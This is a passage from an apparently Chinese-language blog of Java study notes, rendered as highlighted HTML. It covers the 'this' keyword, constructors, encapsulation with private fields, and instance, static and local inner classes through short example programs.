class="variable">ret</span> <span class="operator">=</span> <span class="string">&quot;ctl1&quot;</span>;</span><br><span class="line">        <span class="comment">//通过一个类可以实例化无数对象</span></span><br><span class="line">        dog.func(ret);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main1</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="this"><a href="#this" class="headerlink" title="this"></a>this</h2><ul><li>this的类型：对应类类型引用，即哪个对象调用就是哪个对象的引用类型</li><li>this只能在成员方法中使用</li><li>在成员方法中，this只能引用当前对象，不能再引用其它对象</li><li>this是成员方法第一个隐藏的参数，编译器会自动传递，在成员方法执行时，编译器会负责将调用成员方法对象的引用传递给该成员方法，this来接收</li></ul> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> year;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> month;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> day;</span><br><span class="line">    <span class="comment">//this.day = 1会报错</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getData</span><span class="params">(<span class="type">int</span> year, <span class="type">int</span> month, <span class="type">int</span> day)</span> &#123;</span><br><span class="line">        year = year;</span><br><span class="line">        month = month;</span><br><span class="line">        day = day;</span><br><span class="line">    &#125;<span class="comment">//这里局部变量会被回收，局部变量优先，这里只是自己给自己赋值了</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getData1</span><span class="params">(<span class="type">int</span> year, <span class="type">int</span> month, <span class="type">int</span> day)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.year = year;</span><br><span class="line">        <span class="built_in">this</span>.month = month;</span><br><span class="line">        <span class="built_in">this</span>.day = day;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printData</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(year + <span class="string">&quot;/ &quot;</span> + month + <span class="string">&quot;/ &quot;</span> + day);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printData1</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.year + <span class="string">&quot;/ &quot;</span> + <span class="built_in">this</span>.month + <span class="string">&quot;/ &quot;</span> + <span class="built_in">this</span>.day);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">cal</span> <span class="variable">c1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">cal</span>();</span><br><span class="line">        <span class="type">cal</span> <span class="variable">c2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">cal</span>();</span><br><span class="line">        <span class="type">cal</span> <span class="variable">c3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">cal</span>();</span><br><span class="line"></span><br><span class="line">        c1.getData(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>); <span class="comment">// 0/0/0</span></span><br><span class="line">        c2.getData1(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>);<span class="comment">// 1 / 1/ 1</span></span><br><span class="line">        c3.getData1(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        c1.printData1();</span><br><span class="line">        c2.printData1();</span><br><span class="line">        c3.printData1();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main1</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">cal</span> <span class="variable">c1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">cal</span>();</span><br><span class="line">        <span class="comment">//c1.getData(1,1,10);</span></span><br><span class="line">        <span class="comment">//c1.getData1(2023,6,6);</span></span><br><span class="line">        <span class="comment">/*c1.month=2;</span></span><br><span class="line"><span class="comment">        c1.year=1;</span></span><br><span class="line"><span class="comment">        c1.day=3;*/</span></span><br><span class="line">        c1.printData();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="作业-1"><a href="#作业-1" class="headerlink" title="作业"></a>作业</h3> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Stu</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>  String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setInof</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">myName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;My name is &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">myInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.myName();</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Stu</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Stu</span>();</span><br><span class="line">        stu.setInof(<span class="string">&quot;yxz&quot;</span>, <span class="number">12</span>);</span><br><span class="line">        stu.myName();</span><br><span class="line">        stu.myInfo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Stu</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;yxz&quot;</span>;<span class="comment">//就地初始化，但只适合默认的一些量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setInof</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">myName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;My name is &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//构造方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Stu</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//要写在第一条</span></span><br><span class="line">        <span class="built_in">this</span>(<span class="string">&quot;yxz&quot;</span>, <span class="number">12</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;不带参数的构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Stu</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;<span class="comment">//构造方法可以重载1.方法名相同，2.参数列表不同3.返回值不一定相同</span></span><br><span class="line">        <span class="comment">//this();//不能循环调用</span></span><br><span class="line">        System.out.println(<span class="string">&quot;带俩个参数的构造犯法&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">myInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.myName();</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main2</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Stu</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Stu</span>();<span class="comment">//实例化时一定会调用构造方法，若没有提供，编译器会提供一个</span></span><br><span class="line">        <span class="type">Stu</span> <span class="variable">stu2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Stu</span>(<span class="string">&quot;yxz&quot;</span>, <span class="number">12</span>);<span class="comment">//构造方法调用完成后，对象才实际上产生</span></span><br><span class="line">        <span class="comment">//stu.setInof(&quot;yxz&quot;, 12);//引用类型默认值是null</span></span><br><span class="line"><span class="comment">/*        stu.myName();</span></span><br><span class="line"><span class="comment">        stu.myInfo();*/</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h1> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String add;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;姓名：&quot;</span> + name + <span class="string">&quot;\n&quot;</span> + <span class="string">&quot; 年龄：&quot;</span> + age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main1</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">pe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        pe.setName(<span class="string">&quot;yxz&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="private"><a href="#private" class="headerlink" title="private"></a>private</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Alpha</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> iamprivate;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Alpha</span><span class="params">( <span class="type">int</span> i)</span>&#123;</span><br><span class="line">        iamprivate=i;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isEqualTo</span><span class="params">(Alpha anotherAlpha)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.iamprivate == anotherAlpha.iamprivate)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">       Alpha aa=<span class="keyword">new</span> <span class="title class_">Alpha</span>(<span class="number">10</span>);</span><br><span class="line">       Alpha bb=<span class="keyword">new</span> <span class="title class_">Alpha</span>(<span class="number">12</span>);</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">if</span>(aa.isEqualTo(bb))&#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;equal &quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span>&#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;not equal &quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果是nuo equal </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mport java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="keyword">while</span> (scanner.hasNextInt()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">            p.setAge(age);</span><br><span class="line">            System.out.println(p.getAge());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//write your code here......</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.age &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.age &gt; <span class="number">200</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">200</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Outer</span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 定义内部类Inner */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inner</span>&#123; </span><br><span class="line">    </span><br><span class="line">        <span class="comment">//将外包类的成员变量size递增</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doStuff</span><span class="params">()</span>&#123; </span><br><span class="line">            size++;   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Inner i=<span class="keyword">new</span> <span class="title class_">Inner</span>(); <span class="comment">//成员变量i指向Inner类的对象</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">increaseSize</span><span class="params">()</span>&#123; </span><br><span class="line">        i.doStuff(); <span class="comment">//调用内部类Inner的方法</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] a)</span>&#123; </span><br><span class="line">        Outer o=<span class="keyword">new</span> <span class="title class_">Outer</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i&lt;<span class="number">4</span>; i++)&#123;</span><br><span class="line">           o.increaseSize();</span><br><span class="line">           System.out.println(<span class="string">&quot;The value of size : &quot;</span>+o.size);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Outer</span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 定义内部类Inner */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inner</span>&#123; </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> size;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doStuff</span><span class="params">(<span class="type">int</span> size)</span>&#123; </span><br><span class="line">            size++; <span class="comment">//存取局部变量</span></span><br><span class="line">            <span class="built_in">this</span>.size++;  <span class="comment">//存取内部类的成员变量</span></span><br><span class="line">            Outer.<span class="built_in">this</span>.size++; <span class="comment">//存取其外包类Outer的成员变量</span></span><br><span class="line">            System.out.println(<span class="string">&quot;size in Inner.doStuff(): &quot;</span>+size);</span><br><span class="line">            System.out.println(<span class="string">&quot;size of the Inner class: &quot;</span>+<span class="built_in">this</span>.size);</span><br><span class="line">            System.out.println(<span class="string">&quot;size of the Outer class:  &quot;</span>+Outer.<span class="built_in">this</span>.size);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Inner i=<span class="keyword">new</span> <span class="title class_">Inner</span>(); <span class="comment">//成员变量i指向Inner类的对象</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">increaseSize</span><span class="params">(<span class="type">int</span> s)</span>&#123; </span><br><span class="line">        i.doStuff(s); <span class="comment">//调用内部类Inner的方法</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] a)</span>&#123; </span><br><span class="line">        Outer o=<span class="keyword">new</span> <span class="title class_">Outer</span>();</span><br><span class="line">        </span><br><span class="line">        o.increaseSize(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Outer</span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> size=<span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 方法makeInner()，返回一内部类对象 */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">makeInner</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> finalLocalVar)</span>&#123; </span><br><span class="line">        <span class="type">int</span> LocalVar=<span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">Inner</span>&#123; </span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123; </span><br><span class="line">                <span class="keyword">return</span> (<span class="string">&quot;#&lt;Inner size=&quot;</span>+size+</span><br><span class="line">                 </span><br><span class="line">                <span class="string">&quot; finalLocalVar=&quot;</span>+finalLocalVar+<span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Inner</span>(); <span class="comment">//方法makeInner()返回一内部类对象</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Outer outer=<span class="keyword">new</span> <span class="title class_">Outer</span> ();</span><br><span class="line">        Object obj=outer.makeInner(<span class="number">40</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;The object is &quot;</span>+obj.toString());</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">OuterClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> data1;</span><br><span class="line">    <span class="type">int</span> data2;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> data3;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;OuterClass:;test()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//实例内部类</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">InnerClass</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="variable">data1</span> <span class="operator">=</span> <span class="number">122</span>;<span class="comment">//就近原则，若非要外部类中的data1则可以用Outer.this.data1;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> data4;</span><br><span class="line">        <span class="type">int</span> data5;</span><br><span class="line">        <span class="comment">//public static int data5; // error static是类的成员，Inner和成员是一级的</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">data6</span> <span class="operator">=</span> <span class="number">6</span>;<span class="comment">//但需要更高的版本，加上final变成常量了</span></span><br><span class="line">        <span class="comment">//实力内部类当中，不能有静态成员变量，非要定义用final</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">func</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;InnerClass::func()&quot;</span>);</span><br><span class="line">            System.out.println(OuterClass.<span class="built_in">this</span>.data1);</span><br><span class="line">            System.out.println(data2);</span><br><span class="line">            System.out.println(data3);</span><br><span class="line">            System.out.println(data4);</span><br><span class="line">            System.out.println(data5);</span><br><span class="line">            System.out.println(data6);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Inner&quot;</span>);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> <span class="number">10</span>;<span class="comment">//定义常量，在编译时就确定了，一旦初始化，不能修改</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">OuterClass</span> <span class="variable">oc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OuterClass</span>();</span><br><span class="line">        System.out.println(oc.data1);</span><br><span class="line">        OuterClass.<span class="type">InnerClass</span> <span class="variable">ic</span> <span class="operator">=</span> oc.<span class="keyword">new</span> <span class="title class_">InnerClass</span>();<span class="comment">//获取实例内部类对象</span></span><br><span class="line">        ic.func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>外部类中的任何成员都可以在实例内部类方法中直接访问</li><li>实力内部类所在位置与外部类成员位置相同，因此也受public 等访问限制符的约束</li><li>在实例内部类中访问同名的成员时优先访问自己的，如果要访问外部类的同名成员，必须用：外部类名.this.同名成员来访问</li><li>实例内部类对象必须是在先有外部类对象的前提下才能创建</li><li>实力内部类的非静态方法包含了一个指向外部类的引用</li><li>外部类中，不能直接访问实例内部了中的成员，如果要访问不许先创建内部类的对象</li></ul><h2 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">OuterClass2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">data1</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">data2</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">data3</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;out::test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">InnerClass2</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="variable">data4</span> <span class="operator">=</span> <span class="number">4</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">data5</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">data6</span> <span class="operator">=</span> <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">func</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;inn::test&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*System.out.println(this.data1);</span></span><br><span class="line"><span class="comment">            System.out.println(data2);*/</span><span class="comment">//无法访问外部类的非静态成员</span></span><br><span class="line">            <span class="comment">//非要访问</span></span><br><span class="line">            <span class="type">OuterClass2</span> <span class="variable">oc3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OuterClass2</span>();</span><br><span class="line">            System.out.println(oc3.data1);</span><br><span class="line">            System.out.println(data3);</span><br><span class="line">            System.out.println(data4);</span><br><span class="line">            System.out.println(data5);</span><br><span class="line">            System.out.println(data6);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        OuterClass2.<span class="type">InnerClass2</span> <span class="variable">oc2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OuterClass2</span>.InnerClass2();<span class="comment">//这样不需要先创建外部类对象</span></span><br><span class="line">        oc2.func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>静态内部类中只能访问外部类中的静态成员</li><li>非要访问，得新建一个外部类对象</li><li>创建静态内部类是不需要创建外部类对象</li></ul><h2 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a>局部内部类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">Inner</span> &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;dasdsadsad&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Inner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Inner</span>();</span><br><span class="line">        in.test();<span class="comment">//只能在方法中使用</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title 